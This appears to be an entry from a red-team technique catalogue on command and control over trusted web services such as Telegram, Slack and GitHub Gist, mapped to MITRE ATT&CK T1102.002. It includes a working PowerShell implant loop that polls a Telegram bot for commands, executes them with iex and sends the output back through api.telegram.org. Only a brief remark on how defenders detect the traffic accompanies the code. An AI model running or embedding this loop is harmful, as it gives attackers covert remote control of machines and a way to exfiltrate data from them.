---
id: web-service-c2-telegram
title: C2 over a legitimate web service (Telegram / Slack / Gist)
section: Command & Control
phase: Command & Control
attack:
  tactic: TA0011
  techniques: [T1102.002]
platform: [windows]
source: MITRE ATT&CK T1102.002; web-service bidirectional C2
pair: web-service-c2-beacon
---

Instead of standing up infrastructure, ride a trusted third-party API for
bidirectional C2: the implant reads tasks from and posts results to a Telegram bot,
a Slack channel, or a GitHub Gist. The destination is `api.telegram.org` /
`slack.com` / `api.github.com` — allowlisted, TLS, high reputation — so egress
filtering and domain reputation both pass. The tell is the *process*: a
non-browser binary making periodic TLS calls to a SaaS API it has no business
touching.

```powershell
# poll a Telegram bot for commands, execute, post output back — all over api.telegram.org
$b="<bot-token>"; $c="<chat-id>"
while($true){
  $u=irm "https://api.telegram.org/bot$b/getUpdates?offset=-1"
  $cmd=$u.result[-1].message.text
  $o=iex $cmd 2>&1 | Out-String
  irm "https://api.telegram.org/bot$b/sendMessage" -Body @{chat_id=$c;text=$o} | Out-Null
  Start-Sleep 60
}
```
